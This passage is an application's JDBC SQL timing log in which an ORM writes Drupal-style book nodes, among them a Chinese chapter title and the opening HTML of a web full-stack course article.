as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=4 
 {executed in 1 msec}
2020-11-19 11:00:26.556 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:00:26.557 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '531972004415189', 'zh-hans', 4, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.563 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=4 
 {executed in 0 msec}
2020-11-19 11:00:26.564 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:00:26.565 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=4 
 {executed in 0 msec}
2020-11-19 11:00:26.565 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:00:26.566 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
2, 1, 1, 4, 0, 0, 0, 1, 0, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.570 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.571 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:00:26.572 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=4 
 {executed in 1 msec}
2020-11-19 11:00:26.572 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:00:26.573 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('', '', 'book', 0, 'full_html', 'zh-hans', 4, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.580 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_0_, nodebodyen0_.body_value as body_val2_3_0_, 
nodebodyen0_.body_summary as body_sum3_3_0_, nodebodyen0_.bundle as bundle4_3_0_, nodebodyen0_.delta 
as delta5_3_0_, nodebodyen0_.body_format as body_for6_3_0_, nodebodyen0_.langcode as langcode7_3_0_, 
nodebodyen0_.revision_id as revision8_3_0_ from node__body nodebodyen0_ where nodebodyen0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.581 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:00:26.582 INFO  jdbc.sqltiming Line:373 - insert into node__body (body_value, body_summary, bundle, delta, body_format, langcode, revision_id, 
entity_id) values ('', '', 'book', 0, 'full_html', 'zh-hans', 4, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.587 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_, nodefiledd0_.changed as changed2_9_, nodefiledd0_.created 
as created3_9_, nodefiledd0_.default_langcode as default_4_9_, nodefiledd0_.langcode as langcode5_9_, 
nodefiledd0_.promote as promote6_9_, nodefiledd0_.revision_translation_affected as revision7_9_, 
nodefiledd0_.status as status8_9_, nodefiledd0_.sticky as sticky9_9_, nodefiledd0_.title as 
title10_9_, nodefiledd0_.type as type11_9_, nodefiledd0_.uid as uid12_9_, nodefiledd0_.vid 
as vid13_9_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=4 
 {executed in 0 msec}
2020-11-19 11:00:26.588 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:00:26.589 INFO  jdbc.sqltiming Line:373 - select nodefieldr0_.nid as nid1_10_0_, nodefieldr0_.changed as changed2_10_0_, nodefieldr0_.created 
as created3_10_0_, nodefieldr0_.default_langcode as default_4_10_0_, nodefieldr0_.langcode 
as langcode5_10_0_, nodefieldr0_.promote as promote6_10_0_, nodefieldr0_.revision_translation_affected 
as revision7_10_0_, nodefieldr0_.status as status8_10_0_, nodefieldr0_.sticky as sticky9_10_0_, 
nodefieldr0_.title as title10_10_0_, nodefieldr0_.uid as uid11_10_0_, nodefieldr0_.vid as vid12_10_0_ 
from node_field_revision nodefieldr0_ where nodefieldr0_.nid=4 
 {executed in 0 msec}
2020-11-19 11:00:26.590 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|----|----|

2020-11-19 11:00:26.591 INFO  jdbc.sqltiming Line:373 - insert into node_field_revision (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, uid, vid, nid) values (1605754826, 1605754826, 1, 'zh-hans', 0, 1, 1, 
0, '06丨第六章 专题 (7讲)', 1, 4, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.596 INFO  jdbc.sqltiming Line:373 - select nodefiledd0_.nid as nid1_9_0_, nodefiledd0_.changed as changed2_9_0_, nodefiledd0_.created 
as created3_9_0_, nodefiledd0_.default_langcode as default_4_9_0_, nodefiledd0_.langcode as 
langcode5_9_0_, nodefiledd0_.promote as promote6_9_0_, nodefiledd0_.revision_translation_affected 
as revision7_9_0_, nodefiledd0_.status as status8_9_0_, nodefiledd0_.sticky as sticky9_9_0_, 
nodefiledd0_.title as title10_9_0_, nodefiledd0_.type as type11_9_0_, nodefiledd0_.uid as uid12_9_0_, 
nodefiledd0_.vid as vid13_9_0_ from node_field_data nodefiledd0_ where nodefiledd0_.nid=4 
 {executed in 0 msec}
2020-11-19 11:00:26.597 INFO  jdbc.resultsettable Line:610 - 
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|nid |changed |created |default_langcode |langcode |promote |revision_translation_affected |status |sticky |title |type |uid |vid |
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|
|----|--------|--------|-----------------|---------|--------|------------------------------|-------|-------|------|-----|----|----|

2020-11-19 11:00:26.599 INFO  jdbc.sqltiming Line:373 - insert into node_field_data (changed, created, default_langcode, langcode, promote, revision_translation_affected, 
status, sticky, title, type, uid, vid, nid) values (1605754826, 1605754826, 1, 'zh-hans', 0, 
1, 1, 0, '06丨第六章 专题 (7讲)', 'book', 1, 4, 4) 
 {executed in 1 msec}
2020-11-19 11:00:26.603 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_, bookfieldm0_.bundle as bundle2_7_, bookfieldm0_.delta 
as delta3_7_, bookfieldm0_.langcode as langcode4_7_, bookfieldm0_.field_media_value as field_me5_7_, 
bookfieldm0_.revision_id as revision6_7_ from node__field_media bookfieldm0_ where bookfieldm0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.604 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:00:26.605 INFO  jdbc.sqltiming Line:373 - select bookfieldm0_.entity_id as entity_i1_7_0_, bookfieldm0_.bundle as bundle2_7_0_, bookfieldm0_.delta 
as delta3_7_0_, bookfieldm0_.langcode as langcode4_7_0_, bookfieldm0_.field_media_value as 
field_me5_7_0_, bookfieldm0_.revision_id as revision6_7_0_ from node__field_media bookfieldm0_ 
where bookfieldm0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.606 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:00:26.607 INFO  jdbc.sqltiming Line:373 - insert into node__field_media (bundle, delta, langcode, field_media_value, revision_id, entity_id) 
values ('book', 0, 'zh-hans', '', 4, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.614 INFO  jdbc.sqltiming Line:373 - select nodefieldm0_.entity_id as entity_i1_16_0_, nodefieldm0_.bundle as bundle2_16_0_, nodefieldm0_.delta 
as delta3_16_0_, nodefieldm0_.langcode as langcode4_16_0_, nodefieldm0_.field_media_value as 
field_me5_16_0_, nodefieldm0_.revision_id as revision6_16_0_ from node_revision__field_media 
nodefieldm0_ where nodefieldm0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.615 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------------|------------|
|entity_id |bundle |delta |langcode |field_media_value |revision_id |
|----------|-------|------|---------|------------------|------------|
|----------|-------|------|---------|------------------|------------|

2020-11-19 11:00:26.616 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_media (bundle, delta, langcode, field_media_value, revision_id, 
entity_id) values ('book', 0, 'zh-hans', '', 4, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.623 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_, bookfieldc0_.bundle as bundle2_4_, bookfieldc0_.field_comment_value 
as field_co3_4_, bookfieldc0_.delta as delta4_4_, bookfieldc0_.field_comment_format as field_co5_4_, 
bookfieldc0_.langcode as langcode6_4_, bookfieldc0_.revision_id as revision7_4_ from node__field_comment 
bookfieldc0_ where bookfieldc0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.623 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:00:26.625 INFO  jdbc.sqltiming Line:373 - select bookfieldc0_.entity_id as entity_i1_4_0_, bookfieldc0_.bundle as bundle2_4_0_, bookfieldc0_.field_comment_value 
as field_co3_4_0_, bookfieldc0_.delta as delta4_4_0_, bookfieldc0_.field_comment_format as 
field_co5_4_0_, bookfieldc0_.langcode as langcode6_4_0_, bookfieldc0_.revision_id as revision7_4_0_ 
from node__field_comment bookfieldc0_ where bookfieldc0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.625 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:00:26.627 INFO  jdbc.sqltiming Line:373 - insert into node__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '', 0, 'full_html', 'zh-hans', 4, 4) 
 {executed in 1 msec}
2020-11-19 11:00:26.639 INFO  jdbc.sqltiming Line:373 - select nodefieldc0_.entity_id as entity_i1_13_0_, nodefieldc0_.bundle as bundle2_13_0_, nodefieldc0_.field_comment_value 
as field_co3_13_0_, nodefieldc0_.delta as delta4_13_0_, nodefieldc0_.field_comment_format as 
field_co5_13_0_, nodefieldc0_.langcode as langcode6_13_0_, nodefieldc0_.revision_id as revision7_13_0_ 
from node_revision__field_comment nodefieldc0_ where nodefieldc0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.640 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|--------------------|------|---------------------|---------|------------|
|entity_id |bundle |field_comment_value |delta |field_comment_format |langcode |revision_id |
|----------|-------|--------------------|------|---------------------|---------|------------|
|----------|-------|--------------------|------|---------------------|---------|------------|

2020-11-19 11:00:26.641 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_comment (bundle, field_comment_value, delta, field_comment_format, 
langcode, revision_id, entity_id) values ('book', '', 0, 'full_html', 'zh-hans', 4, 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.647 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_, bookfieldt0_.bundle as bundle2_8_, bookfieldt0_.delta 
as delta3_8_, bookfieldt0_.langcode as langcode4_8_, bookfieldt0_.revision_id as revision5_8_, 
bookfieldt0_.field_thumb_value as field_th6_8_ from node__field_thumb bookfieldt0_ where bookfieldt0_.entity_id=4 
 {executed in 1 msec}
2020-11-19 11:00:26.647 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:00:26.648 INFO  jdbc.sqltiming Line:373 - select bookfieldt0_.entity_id as entity_i1_8_0_, bookfieldt0_.bundle as bundle2_8_0_, bookfieldt0_.delta 
as delta3_8_0_, bookfieldt0_.langcode as langcode4_8_0_, bookfieldt0_.revision_id as revision5_8_0_, 
bookfieldt0_.field_thumb_value as field_th6_8_0_ from node__field_thumb bookfieldt0_ where 
bookfieldt0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.649 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:00:26.651 INFO  jdbc.sqltiming Line:373 - insert into node__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, entity_id) 
values ('book', 0, 'zh-hans', 4, '', 4) 
 {executed in 1 msec}
2020-11-19 11:00:26.658 INFO  jdbc.sqltiming Line:373 - select nodefieldt0_.entity_id as entity_i1_17_0_, nodefieldt0_.bundle as bundle2_17_0_, nodefieldt0_.delta 
as delta3_17_0_, nodefieldt0_.langcode as langcode4_17_0_, nodefieldt0_.revision_id as revision5_17_0_, 
nodefieldt0_.field_thumb_value as field_th6_17_0_ from node_revision__field_thumb nodefieldt0_ 
where nodefieldt0_.entity_id=4 
 {executed in 1 msec}
2020-11-19 11:00:26.658 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|---------|------------|------------------|
|entity_id |bundle |delta |langcode |revision_id |field_thumb_value |
|----------|-------|------|---------|------------|------------------|
|----------|-------|------|---------|------------|------------------|

2020-11-19 11:00:26.660 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_thumb (bundle, delta, langcode, revision_id, field_thumb_value, 
entity_id) values ('book', 0, 'zh-hans', 4, '', 4) 
 {executed in 0 msec}
2020-11-19 11:00:26.664 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_5_0_, bookfieldf0_.bundle as bundle2_5_0_, bookfieldf0_.delta 
as delta3_5_0_, bookfieldf0_.field_fenlei_target_id as field_fe4_5_0_, bookfieldf0_.langcode 
as langcode5_5_0_, bookfieldf0_.revision_id as revision6_5_0_ from node__field_fenlei bookfieldf0_ 
where bookfieldf0_.entity_id=4 
 {executed in 1 msec}
2020-11-19 11:00:26.664 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:00:26.669 INFO  jdbc.sqltiming Line:373 - insert into node__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 4, 4) 
 {executed in 4 msec}
2020-11-19 11:00:26.674 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_14_0_, nodefieldf0_.bundle as bundle2_14_0_, nodefieldf0_.delta 
as delta3_14_0_, nodefieldf0_.field_fenlei_target_id as field_fe4_14_0_, nodefieldf0_.langcode 
as langcode5_14_0_, nodefieldf0_.revision_id as revision6_14_0_ from node_revision__field_fenlei 
nodefieldf0_ where nodefieldf0_.entity_id=4 
 {executed in 0 msec}
2020-11-19 11:00:26.675 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------------|---------|------------|
|entity_id |bundle |delta |field_fenlei_target_id |langcode |revision_id |
|----------|-------|------|-----------------------|---------|------------|
|----------|-------|------|-----------------------|---------|------------|

2020-11-19 11:00:26.676 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fenlei (bundle, delta, field_fenlei_target_id, langcode, revision_id, 
entity_id) values ('book', 0, 1, 'zh-hans', 4, 4) 
 {executed in 0 msec}
2020-11-19 11:01:02.952 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_, bookfieldf0_.bundle as bundle2_6_, bookfieldf0_.delta 
as delta3_6_, bookfieldf0_.field_fsid_value as field_fs4_6_, bookfieldf0_.langcode as langcode5_6_, 
bookfieldf0_.revision_id as revision6_6_ from node__field_fsid bookfieldf0_ where bookfieldf0_.field_fsid_value='786040107286715' 
 {executed in 0 msec}
2020-11-19 11:01:02.954 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:01:02.956 INFO  jdbc.sqltiming Line:373 - insert into node_revision (langcode, nid, revision_default, revision_timestamp, revision_uid) 
values ('zh-hans', 0, 1, 1605754862, 1) 
 {executed in 1 msec}
2020-11-19 11:01:02.956 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node_revision (langcode, nid, revision_default, revision_timestamp, 
revision_uid) values ('zh-hans', 0, 1, 1605754862, 1) 
 {executed in 0 msec}
2020-11-19 11:01:02.957 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|5             |
|--------------|

2020-11-19 11:01:02.962 INFO  jdbc.sqltiming Line:373 - insert into node (langcode, type, uuid, vid) values ('zh-hans', 'book', '9d895a3e-394c-431a-8f73-2cba71be291d', 
5) 
 {executed in 1 msec}
2020-11-19 11:01:02.962 INFO  jdbc.sqltiming Line:373 - getGeneratedKeys on query: insert into node (langcode, type, uuid, vid) values ('zh-hans', 
'book', '9d895a3e-394c-431a-8f73-2cba71be291d', 5) 
 {executed in 0 msec}
2020-11-19 11:01:02.963 INFO  jdbc.resultsettable Line:610 - 
|--------------|
|generated_key |
|--------------|
|5             |
|--------------|

2020-11-19 11:01:02.968 INFO  jdbc.sqltiming Line:373 - update node_revision set langcode='zh-hans', nid=5, revision_default=1, revision_timestamp=1605754862, 
revision_uid=1 where vid=5 
 {executed in 0 msec}
2020-11-19 11:01:02.972 INFO  jdbc.sqltiming Line:373 - select bookfieldf0_.entity_id as entity_i1_6_0_, bookfieldf0_.bundle as bundle2_6_0_, bookfieldf0_.delta 
as delta3_6_0_, bookfieldf0_.field_fsid_value as field_fs4_6_0_, bookfieldf0_.langcode as langcode5_6_0_, 
bookfieldf0_.revision_id as revision6_6_0_ from node__field_fsid bookfieldf0_ where bookfieldf0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:02.973 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:01:02.974 INFO  jdbc.sqltiming Line:373 - insert into node__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, entity_id) 
values ('book', 0, '786040107286715', 'zh-hans', 5, 5) 
 {executed in 0 msec}
2020-11-19 11:01:02.978 INFO  jdbc.sqltiming Line:373 - select nodefieldf0_.entity_id as entity_i1_15_0_, nodefieldf0_.bundle as bundle2_15_0_, nodefieldf0_.delta 
as delta3_15_0_, nodefieldf0_.field_fsid_value as field_fs4_15_0_, nodefieldf0_.langcode as 
langcode5_15_0_, nodefieldf0_.revision_id as revision6_15_0_ from node_revision__field_fsid 
nodefieldf0_ where nodefieldf0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:02.979 INFO  jdbc.resultsettable Line:610 - 
|----------|-------|------|-----------------|---------|------------|
|entity_id |bundle |delta |field_fsid_value |langcode |revision_id |
|----------|-------|------|-----------------|---------|------------|
|----------|-------|------|-----------------|---------|------------|

2020-11-19 11:01:02.980 INFO  jdbc.sqltiming Line:373 - insert into node_revision__field_fsid (bundle, delta, field_fsid_value, langcode, revision_id, 
entity_id) values ('book', 0, '786040107286715', 'zh-hans', 5, 5) 
 {executed in 0 msec}
2020-11-19 11:01:02.984 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_, bookentity0_.bid as bid2_1_, bookentity0_.depth as depth3_1_, 
bookentity0_.has_children as has_chil4_1_, bookentity0_.p1 as p5_1_, bookentity0_.p2 as p6_1_, 
bookentity0_.p3 as p7_1_, bookentity0_.p4 as p8_1_, bookentity0_.p5 as p9_1_, bookentity0_.pid 
as pid10_1_, bookentity0_.weight as weight11_1_ from book bookentity0_ where bookentity0_.nid=5 
 {executed in 0 msec}
2020-11-19 11:01:02.985 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:01:02.986 INFO  jdbc.sqltiming Line:373 - select bookentity0_.nid as nid1_1_0_, bookentity0_.bid as bid2_1_0_, bookentity0_.depth as 
depth3_1_0_, bookentity0_.has_children as has_chil4_1_0_, bookentity0_.p1 as p5_1_0_, bookentity0_.p2 
as p6_1_0_, bookentity0_.p3 as p7_1_0_, bookentity0_.p4 as p8_1_0_, bookentity0_.p5 as p9_1_0_, 
bookentity0_.pid as pid10_1_0_, bookentity0_.weight as weight11_1_0_ from book bookentity0_ 
where bookentity0_.nid=5 
 {executed in 1 msec}
2020-11-19 11:01:02.986 INFO  jdbc.resultsettable Line:610 - 
|----|----|------|-------------|---|---|---|---|---|----|-------|
|nid |bid |depth |has_children |p1 |p2 |p3 |p4 |p5 |pid |weight |
|----|----|------|-------------|---|---|---|---|---|----|-------|
|----|----|------|-------------|---|---|---|---|---|----|-------|

2020-11-19 11:01:02.987 INFO  jdbc.sqltiming Line:373 - insert into book (bid, depth, has_children, p1, p2, p3, p4, p5, pid, weight, nid) values (1, 
3, 0, 1, 4, 5, 0, 0, 4, 0, 5) 
 {executed in 0 msec}
2020-11-19 11:01:02.992 INFO  jdbc.sqltiming Line:373 - select nodebodyen0_.entity_id as entity_i1_3_, nodebodyen0_.body_value as body_val2_3_, nodebodyen0_.body_summary 
as body_sum3_3_, nodebodyen0_.bundle as bundle4_3_, nodebodyen0_.delta as delta5_3_, nodebodyen0_.body_format 
as body_for6_3_, nodebodyen0_.langcode as langcode7_3_, nodebodyen0_.revision_id as revision8_3_ 
from node__body nodebodyen0_ where nodebodyen0_.entity_id=5 
 {executed in 1 msec}
2020-11-19 11:01:02.992 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:01:02.993 INFO  jdbc.sqltiming Line:373 - select nodebodyre0_.entity_id as entity_i1_12_0_, nodebodyre0_.body_value as body_val2_12_0_, 
nodebodyre0_.body_summary as body_sum3_12_0_, nodebodyre0_.bundle as bundle4_12_0_, nodebodyre0_.delta 
as delta5_12_0_, nodebodyre0_.body_format as body_for6_12_0_, nodebodyre0_.langcode as langcode7_12_0_, 
nodebodyre0_.revision_id as revision8_12_0_ from node_revision__body nodebodyre0_ where nodebodyre0_.entity_id=5 
 {executed in 0 msec}
2020-11-19 11:01:02.994 INFO  jdbc.resultsettable Line:610 - 
|----------|-----------|-------------|-------|------|------------|---------|------------|
|entity_id |body_value |body_summary |bundle |delta |body_format |langcode |revision_id |
|----------|-----------|-------------|-------|------|------------|---------|------------|
|----------|-----------|-------------|-------|------|------------|---------|------------|

2020-11-19 11:01:03.001 INFO  jdbc.sqltiming Line:373 - insert into node_revision__body (body_value, body_summary, bundle, delta, body_format, langcode, 
revision_id, entity_id) values ('<div data-slate-editor="true" data-key="505" autocorrect="off" 
spellcheck="false" data-gramm="false" style="outline: none; white-space: pre-wrap; overflow-wrap: 
break-word;"> <div class="se-5058f413 " data-slate-type="paragraph" data-slate-object="block" 
data-key="506"> <span data-slate-object="text" data-key="507"><span data-slate-leaf="true" 
data-offset-key="507:0" data-first-offset="true"><span data-slate-string="true">你好，我是四火。</span></span></span> 
</div> <div class="se-98809fe8 " data-slate-type="paragraph" data-slate-object="block" data-key="508"> 
<span data-slate-object="text" data-key="509"><span data-slate-leaf="true" data-offset-key="509:0" 
data-first-offset="true"><span data-slate-string="true">专栏更到这里，我们已经把基于 Web 全栈的这棵大树，主要的枝枝丫丫大致都覆盖到了，可是，技术上我们总是希望“更进一步”。这棵大树所在的森林中，还有着广阔的领域等待着探索。当然，我想明确的是，我知道很多程序员还是会继续坚持这条路，因为全栈工程师本身是一个非常理想的职业发展方向，毕竟这个角色，大厂招，创业小团队更是需要；但同时我也知道，也有很多走在 
Web 全栈路上的工程师，有着更多的想法，想尝试不一样的“可能性”，而这，就是我想说的个人的“全栈衍化”了。</span></span></span> </div> <h2 class="se-475b2ef8" 
data-slate-type="heading" data-slate-object="block" data-key="510"><span data-slate-object="text" 
data-key="511"><span data-slate-leaf="true" data-offset-key="511:0" data-first-offset="true"><span 
data-slate-string="true">个人</span></span></span></h2> <div class="se-ae77b201 " data-slate-type="paragraph" 
data-slate-object="block" data-key="512"> <span data-slate-object="text" data-key="513"><span 
data-slate-leaf="true" data-offset-key="513:0" data-first-offset="true"><span data-slate-string="true">不知道你是否能记得起，我在这个专栏的 
</span></span></span><a data-slate-type="link" data-slate-object="inline" data-key="514" class="se-9a604d3a 
se-490c3d6a"><span data-slate-object="text" data-key="515"><span data-slate-leaf="true" data-offset-key="515:0" 
data-first-offset="true"><span data-slate-string="true">[开篇词]</span></span></span></a><span 
data-slate-object="text" data-key="516"><span data-slate-leaf="true" data-offset-key="516:0" 
